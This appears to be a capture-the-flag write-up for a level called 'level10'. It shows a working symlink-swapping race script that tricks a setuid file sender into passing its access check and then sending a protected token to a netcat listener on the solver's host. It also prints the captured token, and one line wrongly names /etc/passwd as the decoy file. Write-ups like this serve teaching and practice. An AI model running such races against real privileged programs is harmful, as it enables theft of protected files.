## level10

This is the most interesting challenge. Once again we have an unreadable token file and a `level10` executable with the setuid bit set.

```
$ ./level10
./level10 file host
    sends file to host if you have access to it
```

The disassembled code is much bigger, but it indeed looks like a file sending program. It first checks with `access` if we have the rights to the file, then connects to port `6969` of the given host and sends the file.

The first step was to launch a server on port `6969` on the host machine: `nc -lk 6969`

Now comes the TOCTOU attack (time-of-check to time-of-use). Since the program doesn't run infinitely fast, there is a gap between the `access` check and the sending of the file. We can exploit it by rotating symbolic links. One link must be a file readable by us, another must be `token`.

First create a dummy file where you have the access rights: `echo garbage > /tmp/garbage`

```bash
#!/bin/bash

while true; do
    ln -sf /tmp/garbage /tmp/exploit_link
    ln -sf /home/user/level10/token /tmp/exploit_link
done &

while true; do
    /home/user/level10/level10 /tmp/exploit_link 10.x.x.x
done

kill $(jobs -p)
```

Running this script will sometimes fail the `access` check and sometimes fail the `read` of the file. But if the timing is right, it will `access` `/etc/passwd` and `read+send` `/home/user/level10/token` to the host machine: `woupa2yuojeeaaed06riuj63c`.
